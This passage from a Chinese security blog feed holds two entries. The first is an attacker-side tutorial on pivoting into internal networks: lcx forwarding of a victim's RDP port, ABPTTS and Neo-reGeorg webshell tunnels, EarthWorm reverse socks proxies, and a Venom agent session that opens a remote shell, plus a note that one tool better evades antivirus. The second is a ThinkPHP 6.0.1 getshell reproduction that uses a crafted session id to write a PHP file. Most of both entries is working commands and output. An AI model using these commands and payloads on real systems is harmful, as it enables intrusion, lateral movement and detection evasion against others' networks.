
<p>暂未看透。待更新。</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
        <category>好文</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>内网穿透大合集</title>
    <url>/2020/01/24/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%A4%A7%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><p>学习内网穿透涉及到2个概念</p>
<p>1、正向代理<br>2、反向代理<br>3、端口转发<br>4、端口映射</p>
<h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><blockquote>
<p>正向代理即是客户端代理，代理客户端，服务端不知道实际发起请求的客户端。</p>
</blockquote>
<p><code>vpn</code>就是很好的一个例子，因为我们国内的<code>ip</code>是无法访问<code>google</code>的，那么我们都需要设置一个代理服务器，也就是<code>vpn</code>，我们才可以访问到<code>google</code>，那么这个过程就是正向代理，过程解析如下。</p>
<p><img src="http://static.zybuluo.com/1kbfree/0wu0cgdcgmgs3wb737h7gx78/image.png" alt="image_1dsr70u3e1lkk1e3q8f213esr279.png-43.1kB"></p>
<h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><blockquote>
<p>反向代理即是服务器端代理，代理服务器，客户端不知道实际提供服务的服务器。</p>
</blockquote>
<p>比如<code>nginx</code>，客户端访问想要服务器的8080端口，可是服务器的8080端口不对外开发，这里通过nginx代理端口，将所有访问80端口的流量都转发到8080端口，这样客户端只需要访问80端口就相当于访问了服务器的8080端口。这里代理的是服务器</p>
<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><h3 id="使用lcx进行端口转发"><a href="#使用lcx进行端口转发" class="headerlink" title="使用lcx进行端口转发"></a>使用<code>lcx</code>进行端口转发</h3><p>简单来说就是，<code>a</code>机器我可以执行命令，但是我想连接他的<code>3389</code>，但是禁止外网连接，那么我们可以用<code>lcx</code>来把<code>3389</code>端口的流量，转发到我们机器的其他端口，比如<code>5555</code>端口，然后连接只要连接<code>127.0.0.1:5555</code>就可以连接<code>a</code>机器的<code>3389</code>了。</p>
<p>把<code>lcx</code>上传到目标服务器（比如我们可以把<code>lcx.exe</code>上传到<code>www.xxx.com</code>地址，然后<code>lcx.exe</code>就变成了<code>www.xxx.com/lcx.exe</code>，然后在目标机器上执行<code>wget</code>讲起下载到目标服务器）</p>
<p>然后执行如下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">本机：lcx.exe -listen 51 33891    注意：本机必须要外网服务器，就是别人可以访问你的ip</span></pre></td></tr><tr><td class="code"><pre><span class="line">目标服务器:lcx.exe -slave 公网ip 51 目标服务器ip 3389</span></pre></td></tr></table></figure>

<p>本机执行的命令意思为：</p>
<p>利用<code>lcx.exe</code>监听本地<code>51</code>端口，然后将其转发到<code>33891</code>端口</p>
<p>目标服务器执行的命令为：</p>
<p>利用<code>lcx.exe</code>去连接本机<code>ip</code>的<code>51</code>端口，并且将目标服务器的<code>3389</code>端口转发给他</p>
<p>攻击机：</p>
<p><img src="http://static.zybuluo.com/1kbfree/0wu0cgdcgmgs3wb737h7gx78/image.png" alt="image.png-23.7kB"></p>
<p>受害机：</p>
<p><img src="http://static.zybuluo.com/1kbfree/g51kx1hkhpjgg668vara7vwu/image.png" alt="image.png-24.2kB"></p>
<p>然后直接连接</p>
<p>攻击机的<code>33891</code>端口即可</p>
<p><img src="http://static.zybuluo.com/1kbfree/wi4i3149atyepl1fcz4l921o/image.png" alt="image.png-23.6kB"></p>
<h3 id="使用abptts进行端口转发"><a href="#使用abptts进行端口转发" class="headerlink" title="使用abptts进行端口转发"></a>使用abptts进行端口转发</h3><blockquote>
<p>这个工具是走HTTP隧道的</p>
</blockquote>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;nccgroup&#x2F;ABPTTS.git </span></pre></td></tr><tr><td class="code"><pre><span class="line">apt install python‐setuptools </span></pre></td></tr><tr><td class="code"><pre><span class="line">apt install python‐pip </span></pre></td></tr><tr><td class="code"><pre><span class="line">pip install ‐‐upgrade pip </span></pre></td></tr><tr><td class="code"><pre><span class="line">python ‐m pip install pycrypto </span></pre></td></tr><tr><td class="code"><pre><span class="line">python ‐m pip install pycryptodome </span></pre></td></tr><tr><td class="code"><pre><span class="line">python ‐m pip install httplib</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">cd ABPTTS </span></pre></td></tr><tr><td class="code"><pre><span class="line">python abpttsfactory.py ‐o webshell</span></pre></td></tr></table></figure>

<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">靶机    192.168.31.99      放置webshell </span></pre></td></tr><tr><td class="code"><pre><span class="line">攻击机  192.168.31.138     python abpttsclient.py -c webshell\config.txt -u &quot;http:&#x2F;&#x2F;192.168.31.99&#x2F;abptts.aspx&quot; -f 127.0.0.1:2233&#x2F;192.168.31.99:22</span></pre></td></tr><tr><td class="code"><pre><span class="line"># 将靶机的22端口转发到本地的2233端口</span></pre></td></tr></table></figure>

<p>这个工具只能<code>asp</code>和<code>jsp</code>环境所以没有利用环境，口头描述啦，可以自行去看<a href="https://blog.csdn.net/include_heqile/article/details/85008629" target="_blank" rel="noopener">相关文章</a></p>
<h2 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h2><p>比如你拿下的内网机器禁止<code>3389</code>出网或者只能特定机器连接的时候，我们可以将<code>3389</code>端口转到其他端口。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -tran 映射端口 连接IP（可以是127.0.0.1，但是连接的时候必须要是外网可以请求的ip） 连接端口</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/pn8qksusiu3sft17a595mf4v/image_1dsr7tvce9861g3ro89n6iq7e9.png" alt="image_1dsr7tvce9861g3ro89n6iq7e9.png-9.7kB"></p>
<p>然后连接他的<code>33899</code>端口即连接他的<code>3389</code>端口了</p>
<p><img src="http://static.zybuluo.com/1kbfree/yyrqj4jiawcc0m0b540ivfqp/image_1dsr81up4pg0b5ignpbtn1orsm.png" alt="image_1dsr81up4pg0b5ignpbtn1orsm.png-28.6kB"></p>
<h2 id="跨平台网络穿透工具-EarthWorm"><a href="#跨平台网络穿透工具-EarthWorm" class="headerlink" title="跨平台网络穿透工具-EarthWorm"></a>跨平台网络穿透工具-<code>EarthWorm</code></h2><blockquote>
<p>下载地址：<br><a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm/</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew参数</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">‐h 查看帮助</span></pre></td></tr><tr><td class="code"><pre><span class="line">‐s 指定链路状态(ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、 lcx_tran)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    ssocksd：正向socks5代理连接;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    rcsocks、rssocks：反向socks5代理连接;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    lcx_slave、lcx_listen：端口转发;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    lcx_tran：端口映射;</span></pre></td></tr><tr><td class="code"><pre><span class="line">‐l 开放指定端口监听;</span></pre></td></tr><tr><td class="code"><pre><span class="line">‐d 指定转发或反弹的主机地址；</span></pre></td></tr><tr><td class="code"><pre><span class="line">‐e 指定转发或反弹的主机端口；</span></pre></td></tr><tr><td class="code"><pre><span class="line">‐f 指定连接或映射的主机地址；</span></pre></td></tr><tr><td class="code"><pre><span class="line">‐g 指定连接或映射的主机端口；</span></pre></td></tr><tr><td class="code"><pre><span class="line">‐t 设置超时时间，默认为10000毫秒，即10秒(单位毫秒，‐h显示有误)；</span></pre></td></tr><tr><td class="code"><pre><span class="line">‐v 显示版本；</span></pre></td></tr><tr><td class="code"><pre><span class="line">‐a 显示关于页面；</span></pre></td></tr></table></figure>

<h3 id="普通网络环境"><a href="#普通网络环境" class="headerlink" title="普通网络环境"></a>普通网络环境</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">目标边界有内外网IP，且可访问外网，但不能和我们服务器相同。</span></pre></td></tr></table></figure>

<h4 id="正向socks5"><a href="#正向socks5" class="headerlink" title="正向socks5"></a>正向socks5</h4><p><strong>此时的网络环境</strong>：目标网络边界存在公网<code>IP</code>且可任意开监听端口</p>
<p>比如某个服务是内网才可以连接的，然后在拿下的内网服务器开启他的<code>1080</code>端口的<code>socket</code>代理，然后使用本机代理就可以直接连接他内网服务</p>
<p>开启<code>1080</code>端口的<code>socket</code>代理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew -s ssocksd -l 1080</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/mlaxk9lt7c46w8av5e8xyw7s/555.png" alt="555.png-33.4kB"></p>
<p>然后设置代理为<code>连接IP:1080</code>，<code>window</code>可以用<code>shadowsocks</code>，<code>linux</code>下修改<code>/etc/proxychains.conf</code>设置代理为目标网络，如图</p>
<p><img src="http://static.zybuluo.com/1kbfree/y4hitf43yinflz6ldfapanai/666.png" alt="666.png-562.5kB"></p>
<p>那么这个时候，你请求什么，都等同于，开启了代理的服务器请求了的。</p>
<p>然后使用代理扫描目标服务器开放的端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains nmap ip -Pn -A</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/9bbxw5kqs70dz9fgbeymm51l/image_1dsrbu9p510cnkaj3dve3is636b.png" alt="image_1dsrbu9p510cnkaj3dve3is636b.png-419.6kB"></p>
<h4 id="反向socks5"><a href="#反向socks5" class="headerlink" title="反向socks5"></a>反向socks5</h4><p><strong>此时的网络环境</strong>：当目标网络边界<code>(Client)</code>不存在公网 <code>IP</code>，需要通过反弹方式创建<code>socks</code>代理，简单来说就是目标服务器是内网<code>IP</code>，但能访问外网。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">VPS服务器：  ew -s rcsocks -l 1080 -e 555 # 将本机的555端口的流量都转发给1080端口，这里1080端口只是用于传输流量</span></pre></td></tr><tr><td class="code"><pre><span class="line">目标服务器： ew -s rssocks -d VPS服务器IP -e 555 # 连接VPS服务器的555端口，表示开一个通道给他</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">然后在VPS服务器上配置proxychains代理链的配置文件，将代理设置成 127.0.0.1 的1080端口：socks5 127.0.0.1 1080 </span></pre></td></tr><tr><td class="code"><pre><span class="line">然后命令前面加上 proxychains即可。如：proxychains curl 192.168.99.99</span></pre></td></tr></table></figure>

<h3 id="二级网络环境"><a href="#二级网络环境" class="headerlink" title="二级网络环境"></a>二级网络环境</h3><h4 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h4><p><strong>此时的网络环境</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">服务器A：192.168.31.133</span></pre></td></tr><tr><td class="code"><pre><span class="line">服务器B：192.168.31.138（内网IP），10.99.91.19（公网IP）</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">A是内部主机，无法访问公网。</span></pre></td></tr><tr><td class="code"><pre><span class="line">B有双网卡，有内外网IP，且可以自由开监听端口。</span></pre></td></tr></table></figure>

<p>我们有<code>A</code>、<code>B</code>权限，但是我们想访问<code>A</code>主机的内网服务的话可以这样操作</p>
<p>在<code>A</code>主机上开启监听端口为<code>6666</code>的<code>socks</code>代理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew -s ssocksd -l 6666</span></pre></td></tr></table></figure>

<p>在<code>B</code>主机上将<code>1080</code>端口收到的<code>socks</code>代理请求转发给<code>A</code>主机的<code>6666</code>端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew -s lcx_tran -l 1080 -f 192.168.31.133 -g 6666</span></pre></td></tr></table></figure>

<p>简单来说就是<code>A</code>无法访问，然后我们通过可以访问<code>A</code>的<code>B</code>来做<code>VPN</code>服务器，就可以访问<code>A</code>了。</p>
<h4 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h4><p><strong>此时的网络环境</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">服务器A：192.168.31.133</span></pre></td></tr><tr><td class="code"><pre><span class="line">服务器B：192.168.31.138</span></pre></td></tr><tr><td class="code"><pre><span class="line">VPS服务器：10.11.91.19</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">服务器A是目标内部主机，无法访问外网。</span></pre></td></tr><tr><td class="code"><pre><span class="line">服务器B是目标边界主机，无公网IP，但能访问外网。</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">思路：在服务器A上走代理通过服务器B出去到VPS</span></pre></td></tr></table></figure>

<p>在<code>VPS</code>上添加<strong>转接隧道</strong>，将<code>1080</code>收到的代理请求转交给反连<code>6666</code>端口的主机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew -s lcx_listen -l 1080 -e 6666</span></pre></td></tr></table></figure>

<p>在<code>A</code>服务器上监听<code>7777</code>端口的的<code>socks</code>代理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew -s ssocksd -l 7777</span></pre></td></tr></table></figure>

<p>在B服务器上开通<code>A</code>服务器和<code>VPS</code>之间的连接隧道</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew -s lcx_slave -d 10.11.91.19 -e 6666 -f 192.168.31.133 -g 7777</span></pre></td></tr></table></figure>

<p>然后连接<code>VPS</code>服务器的<code>1080</code>端口就可以访问服务器<code>A</code>了。</p>
<h2 id="NeoreGeorg"><a href="#NeoreGeorg" class="headerlink" title="NeoreGeorg"></a>NeoreGeorg</h2><p>这是一个走<code>HTTP</code>流量的工具，所以需要上传脚本到<code>WEB</code>服务器然后连接</p>
<blockquote>
<p>下载地址：<br><a href="https://github.com/L-codes/Neo-reGeorg" target="_blank" rel="noopener">https://github.com/L-codes/Neo-reGeorg</a></p>
</blockquote>
<p>安装需要的库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m pip install requires</span></pre></td></tr><tr><td class="code"><pre><span class="line">python -m pip install chardet</span></pre></td></tr><tr><td class="code"><pre><span class="line">python -m pip install certifi</span></pre></td></tr><tr><td class="code"><pre><span class="line">python -m pip install idna</span></pre></td></tr><tr><td class="code"><pre><span class="line">python -m pip install pysocks</span></pre></td></tr><tr><td class="code"><pre><span class="line">python -m pip install requests</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/oh3jwxrh4st5nzx2u5m0djh5/image_1dvuar42l95eu6bsqh1l081ccn9.png" alt="image_1dvuar42l95eu6bsqh1l081ccn9.png-144kB"></p>
<h3 id="正向socks代理"><a href="#正向socks代理" class="headerlink" title="正向socks代理"></a>正向socks代理</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">目标边界： 192.168.31.99      放置WEBSHELL</span></pre></td></tr><tr><td class="code"><pre><span class="line">攻击机：   192.168.31.138     python3 neoreg.py -k 123456 -u http:&#x2F;&#x2F;192.168.31.99&#x2F;tunnel.php</span></pre></td></tr></table></figure>

<p><strong>Step1.</strong> 设置密码生成 <code>tunnel.(aspx|ashx|jsp|jspx|php)</code>并上传到目标边界的<code>WEB</code>服务器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@onlyfree:~&#x2F;Neo-reGeorg# python3 neoreg.py generate -k 123456</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">          &quot;$$$$$$&#39;&#39;  &#39;M$  &#39;$$$@m</span></pre></td></tr><tr><td class="code"><pre><span class="line">        :$$$$$$$$$$$$$$&#39;&#39;$$$$&#39;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       &#39;$&#39;    &#39;JZI&#39;$$&amp;  $$$$&#39;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                 &#39;$$$  &#39;$$$$</span></pre></td></tr><tr><td class="code"><pre><span class="line">                 $$$$  J$$$$&#39;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                m$$$$  $$$$,</span></pre></td></tr><tr><td class="code"><pre><span class="line">                $$$$@  &#39;$$$$_          Neo-reGeorg</span></pre></td></tr><tr><td class="code"><pre><span class="line">             &#39;1t$$$$&#39; &#39;$$$$&lt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">          &#39;$$$$$$$$$$&#39;  $$$$          version 1.1.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">               &#39;@$$$$&#39;  $$$$&#39;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                &#39;$$$$  &#39;$$$@</span></pre></td></tr><tr><td class="code"><pre><span class="line">             &#39;z$$$$$$  @$$$</span></pre></td></tr><tr><td class="code"><pre><span class="line">                r$$$   $$|</span></pre></td></tr><tr><td class="code"><pre><span class="line">                &#39;$$v c$$</span></pre></td></tr><tr><td class="code"><pre><span class="line">               &#39;$$v $$v$$$$$$$$$#</span></pre></td></tr><tr><td class="code"><pre><span class="line">               $$x$$$$$$$$$twelve$$$@$&#39;</span></pre></td></tr><tr><td class="code"><pre><span class="line">             @$$$@L &#39;    &#39;&lt;@$$$$$$$$&#96;</span></pre></td></tr><tr><td class="code"><pre><span class="line">           $$                 &#39;$$$</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    [ Github ] https:&#x2F;&#x2F;github.com&#x2F;L-codes&#x2F;neoreg</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    [+] Mkdir a directory: neoreg_server</span></pre></td></tr><tr><td class="code"><pre><span class="line">    [+] Create neoreg server files:</span></pre></td></tr><tr><td class="code"><pre><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.ashx</span></pre></td></tr><tr><td class="code"><pre><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.js</span></pre></td></tr><tr><td class="code"><pre><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.tomcat.5.jspx</span></pre></td></tr><tr><td class="code"><pre><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.php</span></pre></td></tr><tr><td class="code"><pre><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.jsp</span></pre></td></tr><tr><td class="code"><pre><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.tomcat.5.jsp</span></pre></td></tr><tr><td class="code"><pre><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.aspx</span></pre></td></tr><tr><td class="code"><pre><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.nosocket.php</span></pre></td></tr><tr><td class="code"><pre><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.jspx</span></pre></td></tr></table></figure>

<p><strong>Step2.</strong> 然后会生成<code>neoreg_server</code>目录，里面放置的是<code>tunnel</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/tbvajny313asx8ixqd6hqei2/image_1dvublr00gof85m1p561sm0kul16.png" alt="image_1dvublr00gof85m1p561sm0kul16.png-35.8kB"></p>
<p><strong>Step3.</strong> 然后在目标<code>WEB</code>服务器的根目录放<code>PHP</code>脚本，这里如果目标是<code>JAVA</code>环境那么要上传<code>JSP</code>脚本，我这里测试环境搭建的是<code>phpstudy</code>所以用的<code>PHP</code></p>
<p><strong>Step4.</strong> 在使用 <code>neoreg.py</code> 连接<code>WEB</code>服务器，在本地建立 <code>socks</code> 代理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 neoreg.py -k password -u 放置tunnel的地址</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/0kc436b3a7iv7d6a73dmec84/image_1dvuc2bos1dfll6187314ed9m71j.png" alt="image_1dvuc2bos1dfll6187314ed9m71j.png-87.6kB"></p>
<p>然后代理<code>192.168.31.138</code>的<code>1080</code>端口就可以了</p>
<h2 id="venom"><a href="#venom" class="headerlink" title="venom"></a>venom</h2><blockquote>
<p>下载地址：<br>自行找吧(●’◡’●)</p>
</blockquote>
<blockquote>
<p>Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具。<br>Venom可将多个节点进行连接，然后以节点为跳板，构建多级代理。<br>渗透测试人员可以使用Venom轻松地将网络流量代理到多层内网，并轻松地管理代理节点。</p>
</blockquote>
<h3 id="反向socks代理"><a href="#反向socks代理" class="headerlink" title="反向socks代理"></a>反向socks代理</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">目标边界：  192.168.31.98   agent.exe -rhost 192.168.31.138 -rport 12345</span></pre></td></tr><tr><td class="code"><pre><span class="line">攻击机：    192.168.31.138  .&#x2F;admin_linux_x86 ‐lport 12345</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/3odenmieat4lw8ctfmcyfkkv/image_1dvucut4t17k7pg46alf4nmeq20.png" alt="image_1dvucut4t17k7pg46alf4nmeq20.png-18.1kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/xy0fykj7lv085yd77xiqv62j/image_1dvud2ht7g221gvrbvl1jphuhv2d.png" alt="image_1dvud2ht7g221gvrbvl1jphuhv2d.png-45.6kB"></p>
<p>因为这款工具是交互式的，用法如下</p>
<p><img src="http://static.zybuluo.com/1kbfree/b88kbhtzg5afo3p3i1939byc/111.png" alt="111.png-122.3kB"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@onlyfree:~/Venom v1.1.0# ./admin_linux_x86 -lport 12345</span></pre></td></tr><tr><td class="code"><pre><span class="line">Venom Admin Node Start...</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">  ____   ____  &#123; v1.1  author: Dlive &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  \   \ /   /____   ____   ____   _____</span></pre></td></tr><tr><td class="code"><pre><span class="line">   \   Y   // __ \ /    \ /    \ /     \</span></pre></td></tr><tr><td class="code"><pre><span class="line">    \     /\  ___/|   |  (  &lt;_&gt; )  Y Y  \</span></pre></td></tr><tr><td class="code"><pre><span class="line">     \___/  \___  &gt;___|  /\____/|__|_|  /</span></pre></td></tr><tr><td class="code"><pre><span class="line">                \/     \/             \/</span></pre></td></tr><tr><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="code"><pre><span class="line">(admin node) &gt;&gt;&gt; </span></pre></td></tr><tr><td class="code"><pre><span class="line">[+]Remote connection:  192.168.31.99:61765</span></pre></td></tr><tr><td class="code"><pre><span class="line">[+]A new node connect to admin node success</span></pre></td></tr><tr><td class="code"><pre><span class="line">(admin node) &gt;&gt;&gt; </span></pre></td></tr><tr><td class="code"><pre><span class="line">(admin node) &gt;&gt;&gt; goto 1</span></pre></td></tr><tr><td class="code"><pre><span class="line">node 1</span></pre></td></tr><tr><td class="code"><pre><span class="line">(node 1) &gt;&gt;&gt; shell</span></pre></td></tr><tr><td class="code"><pre><span class="line">You can execute commands in this shell :D, 'exit' to exit.</span></pre></td></tr><tr><td class="code"><pre><span class="line">Microsoft Windows [�汾 10.0.17763.973]</span></pre></td></tr><tr><td class="code"><pre><span class="line">(c) 2018 Microsoft Corporation����������Ȩ����</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">C:\Users\19000\Desktop\������͸\tools\������͸\Venom.v1.1.0\Venom v1.1.0&gt;whoami</span></pre></td></tr><tr><td class="code"><pre><span class="line">whoami</span></pre></td></tr><tr><td class="code"><pre><span class="line">fuck\19000</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">C:\Users\19000\Desktop\������͸\tools\������͸\Venom.v1.1.0\Venom v1.1.0&gt;exit</span></pre></td></tr><tr><td class="code"><pre><span class="line">exit</span></pre></td></tr><tr><td class="code"><pre><span class="line">(node 1) &gt;&gt;&gt; socks 10010</span></pre></td></tr><tr><td class="code"><pre><span class="line">a socks5 proxy of the target node has started up on the local port 10010.</span></pre></td></tr><tr><td class="code"><pre><span class="line">(node 1) &gt;&gt;&gt;</span></pre></td></tr></table></figure>

<p>暂时先记录那么多，等有更好的工具也会更新的。</p>
<blockquote>
<p>正向代理个人偏好：NeoreGeorg（因为走的HTTP隧道，比较不会杀）<br>反向代理个人偏好：venom<br>端口转发个人偏好：abptts（也是HTTP隧道）</p>
</blockquote>
]]></content>
      <categories>
        <category>兴趣爱好</category>
        <category>好文</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp&lt;6.0.2 getshell漏洞</title>
    <url>/2020/01/23/thinkphp-6-0-2-getshell%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<blockquote>
<p><code>thinkphp 6.0.2</code>发布的时候修复了<code>sessionid</code>检查的隐患，经大佬的测试发现如写法不当会造成<code>getshell</code>漏洞</p>
</blockquote>
<p><img src="http://static.zybuluo.com/1kbfree/qvjqyz1tkmamywgx6wh2hijt/image_1dvochtbo143lgr813jdmefm119.png" alt="image_1dvochtbo143lgr813jdmefm119.png-99.8kB"></p>
<p><code>thinkphp</code>会以<code>session id</code>作为文件名来创建对应的<code>session</code>文件保存在<code>/runtime/session/</code>目录</p>
<p>原理思路看的明白，代码看不懂，直接写复现啦。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><blockquote>
<p>漏洞造成的原理：</p>
<p><code>thinkphp</code>会将<code>session id</code>作为文件，而正好<code>thinkphp 6.0.1</code>不会对其值校验，导致可传入任意字符为<code>.php</code>文件<br>那么如果程序写法不当将某可控值传递到<code>session</code>，那么就可以导致写入<code>php</code>文件，并且内容可控导致<code>getshell</code></p>
</blockquote>
<p>Code：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Request</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">App</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Session</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="class"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function">    </span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    	$session_id = Request::get(<span class="string">'sid'</span>); <span class="comment"># 获取get请求的sid参数并赋值给$session_id</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        $username = Request::get(<span class="string">'name'</span>); <span class="comment"># 获取get请求的name参数并赋值给$username</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        $session = <span class="keyword">new</span> Session(<span class="keyword">new</span> App()); <span class="comment"># 创建session类</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        $session-&gt;setId($session_id); <span class="comment"># 设置session id为$session_id变量</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        $session-&gt;set(<span class="string">'username'</span>, $username); <span class="comment"># 设置username值为$username</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        $session-&gt;save(); <span class="comment"># 保存</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>然后请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;tp6&#x2F;public&#x2F;index.php&#x2F;index&#x2F;?sid&#x3D;1234567890123456789012345678.php&amp;name&#x3D;%3C?php%20phpinfo();?%3E</span></pre></td></tr></table></figure>

<p>然后写入的格式为<code>/runtime/session/sess_文件名.php</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/szw19xoakxw4yvl58yhx381x/image_1dvodgi7k1pah9p01jmm1d94b6dm.png" alt="image_1dvodgi7k1pah9p01jmm1d94b6dm.png-143.6kB"></p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
